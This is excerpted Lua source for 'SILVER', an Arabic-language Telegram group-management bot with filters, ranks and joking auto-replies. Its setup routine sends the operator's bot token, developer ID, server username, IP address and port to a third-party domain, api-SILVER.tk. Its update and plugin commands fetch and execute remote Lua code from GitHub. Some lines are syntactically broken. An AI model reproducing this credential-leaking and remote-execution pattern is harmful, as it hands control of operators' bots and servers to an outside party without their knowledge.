...
if res ~= 200 then
print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ SIL ┉  ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪┉ ┉ ┉ ┉ ┉ SIL ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ SIL ┉  ┉ ┉ ┉ ┉≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
data,res = https.request("https://api-SILVER.tk/api-VB6BB/SILVER.php?bn=SILVER&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-SILVER.tk/api-VB6BB/SILVER.php?n=SILVER&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ SIL ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua SILVER.lua')
end 
end
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./SILVER.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("DRG", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S SILVER -X kill
screen -S SILVER ./SILVER
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SRC-SILVER/Files_SILVER/main/File_Bot/commands.lua") 
...
elseif tonumber(user_id) == tonumber(2109267580) then
var = 'مبرمـجسلفر'
elseif tonumber(user_id) == tonumber(1841811835) then
var = 'تاجهن'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then 
...
local SILVER_Msg = ''  
if msgs < 100 then 
SILVER_Msg = 'ليش ماتتفاعل ولك' 
elseif msgs < 200 then 
SILVER_Msg = 'عفيه ابني اتفاعل' 
elseif msgs < 400 then 
SILVER_Msg = 'تفاعل ينطلع بي' 
elseif msgs < 700 then 
SILVER_Msg = 'حلو تفاعلك وليدي' 
elseif msgs < 1200 then 
SILVER_Msg = 'كافر برب التفاعل' 
elseif msgs < 2000 then 
SILVER_Msg = 'ديم راح اخليك المالك' 
elseif msgs < 3500 then 
SILVER_Msg = 'خلاص انت المالك'  
elseif msgs < 4000 then 
SILVER_Msg = 'شكد تحجي ولك ' 
elseif msgs < 4500 then 
SILVER_Msg = 'جيبولي براسيتول'
elseif msgs < 5500 then 
SILVER_Msg = 'ارحمني' 
elseif msgs < 7000 then 
SILVER_Msg = 'علك البوت' 
elseif msgs < 9500 then 
SILVER_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
SILVER_Msg = 'متتت بعدك عايش'  
end 
return SILVER_Msg 
end
...
function plugin_SILVER(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.SILVER and msg then
pre_msg = plugin.SILVER(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceSILVER(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,SILVER_Msg) 
return false  
end 
if text then    
...
os.execute('wget https://raw.githubusercontent.com/SRC-SILVER/SILVER/main/SILVER.lua')
send(msg.chat_id_, msg.id_,' ⌯︙ تم تحديث السورس \n ⌯︙ لديك اخر اصدار لسورس سلفر\n ⌯︙ الاصدار » { v 1.6 }')
dofile('SILVER.lua')  
end
if text == 'الاصدار ⌯' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ⌯︙ اصدار سورس سلفر \n ⌯︙ الاصدار »{ v 1.6 }')
end
...
-------------
if text == "🔮 حصريات و تحديثات سلفر 🔮" and DevSoFi(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس سلفر*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '📂┇𝚂𝙸𝙻𝙵𝙴𝚁 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/SAD1G"}},
}
...
send(msg.chat_id_, msg.id_,'⌯︙  عدد الكروبات الان » { '..#group..' }'..SILVERk..''..SILVER..'\n⌯︙  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
local SILVER1_Msg = database:get(bot_id.."SILVER1:Add:Filter:Rp2"..text..msg.chat_id_)   
if SILVER1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if SILVER_Msg and not Special(msg) then  
local SILVER_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if SILVER_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
database:sadd(bot_id.."SILVER:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."SILVER:blocname"..msg.chat_id_)
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."SILVER:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."SILVER:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."SILVER:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."SILVER:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."SILVER:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."SILVER:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."SILVER:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."SILVER:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."SILVER:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."SILVER:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."SILVER:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "⌯︙ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "x_pxxp")..")\n⌯︙ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."SILVER:teh"..msg.chat_id_).."} بجانب اسمك\n⌯︙ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local SILVERChengName = database:get(bot_id.."SILVER:Cheng:Name"..data.id_)
if not data.first_name_ then 
if SILVERChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..SILVERChengName..']')
database:del(bot_id.."SILVER:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if SILVERChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
"ليش غيرته اسمك بس لا خانوك/ج",
"هذا الحلو غير اسمه 😉",
"حبيبته خانته وراح يترك التلي😂💔",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."SILVER:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local SILVERChengUserName = database:get(bot_id.."SILVER:Cheng:UserName"..data.id_)
if not data.username_ then 
if SILVERChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..SILVERChengUserName..']')
database:del(bot_id.."SILVER:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if SILVERChengUserName ~= data.username_ then 
local Text = {
'شكو غيرت معرفك شنو نشروك بقنوات فضايح😂🥺',
"هاها شو غيرت معرفك بس لا هددتك بنيه 😂",
"شسالفه شو غيرت معرفك خاف كضاك اخو حبيبتك",
...
database:set(bot_id.."SILVER:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local SILVERChengPhoto = database:get(bot_id.."SILVER:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if SILVERChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."SILVER:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if SILVERChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
  ...
  "شكو غيرت الصوره شسالفه ؟؟ كلتلك الحب موحلو 😂",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."SILVER:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
⌯︙ [SILVER programmer](t.me/GD_400) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS SILVER](t.me/ghj2bot)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SRC-SILVER/Files_SILVER/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ⌯︙ اهلا بك في متجر ملفات سلفر\n ⌯︙ ملفات السورس ↓\nٴ≪┉ ┉ ┉ ┉ ┉ SIL ┉  ┉ ┉ ┉ ┉≫ٴ\n\n"
...
local json_file, res = https.request("https://raw.githubusercontent.com/SRC-SILVER/Files_SILVER/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('SILVER.lua')  
else
send(msg.chat_id_, msg.id_," ⌯︙ عذرا الملف لايدعم سورس سلفر \n") 
end
return false
end
...
local UserName = (b.username_ or "SRC-SILVER")
...
function Function_SILVER(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_SILVER, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_SILVER, nil)
return false 
end
...
database:set(bot_id.."SILVER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."SILVER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ⌯︙ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."SILVER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."SILVER1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."SILVER1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."SILVER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ⌯︙ تم منع الكلمه مع التحذير")  
database:del(bot_id.."SILVER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."SILVER1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."SILVER1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."SILVER1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ⌯︙ ارسل الكلمه الان")  
database:set(bot_id.."SILVER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."SILVER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."SILVER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."SILVER1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."SILVER1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."SILVER1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."SILVER1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."SILVER1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."SILVER1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ⌯︙ قائمة المنع \nٴ≪┉ ┉ ┉ ┉ ┉ SIL ┉  ┉ ┉ ┉ ┉≫ٴ\n"
for k,v in pairs(list) do  
local SILVER_Msg = database:get(bot_id.."SILVER1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..SILVER_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'سلفر').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'سلفر')
local SILVER_Msg = {
'أنتهہ ألبۅٛت ݪڪك 🦋',
'شتريد من '..Namebot..'🙂',
,''..Namebot..' لتڪول بۅٛت اسَميہ,
' • عنديہ آسم ترۿ 🍇',
'وبعدين وياك ؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟؟?هههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههه',
'فحطتتتني سييد',
'هاا شتريد ضلعي؟ 🤦‍♂️',
'معيدي مشايف بوت 🌞😂؟',
'عمري فداك '..Namebot..' كول حب🌞💖' 
}
send(msg.chat_id_, msg.id_,'['..SILVER_Msg[math.random(#SILVER_Msg)]..']') 
return false
end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:SILVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ⌯︙ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:SILVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:SILVER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:SILVER:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:SILVER:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"⌯︙ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:SILVER:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:SILVER:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:SILVER:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:SILVER:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:SILVER:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:SILVER:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:SILVER:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:SILVER:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:SILVER:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:SILVER:List:Rd:Sudo")
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚂𝙸𝙻𝙵𝙴𝚁.',url="t.me/x_pxxp"}},
}
local msg_id = msg.id_/2097152/0.5
...
end --الكود حصري سورس سلفر يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:SILVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:SILVER:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"⌯︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:SILVER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:SILVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:SILVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:SILVER:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:SILVER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:SILVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:SILVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:SILVER:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:SILVER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:SILVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:SILVER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:SILVER:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:SILVER:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:SILVER:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:SILVER:Add:Rd:Sudo:Text2"..text)   
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'سلفر').." غادر" or text == 'بوت غادر' then  
...
-- vardump(data) 
SILVERdx(msg.chat_id_, msg.id_, ' ⌯︙ ايدي المجموعة » ( '..msg.chat_id_..' )\n ⌯︙ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ⌯︙ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ⌯︙ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
{
{text = '𝐒𝐈𝐋𝐕𝐄𝐑 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/x_pxxp"},
},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_, msg.id_, t..'ٴ≪┉ ┉ ┉ ┉ ┉ SIL ┉  ┉ ┉ ┉ ┉≫ٴٴ\n⌯︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚂𝙸𝙻𝙵𝙴𝚁. ](t.me/x_pxxp)➤ ')
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'سلفر')
...
SILVER = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(SILVER)
...
--------------------------------------------------------------------------------------------------------------
SourceSILVER(data.message_,data)
plugin_SILVER(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local SILVERAbot = database:get(bot_id.."SILVER1:Add:Filter:Rp2"..text..result.chat_id_)   
if SILVERAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⌯︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⌯︙ ["..SILVERAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local SILVER1_Msg = database:get(bot_id.."SILVER1:Add:Filter:Rp2"..text..result.chat_id_)   
if SILVER1_Msg then    
send(msg.chat_id_, msg.id_," ⌯︙ "..SILVER1_Msg)
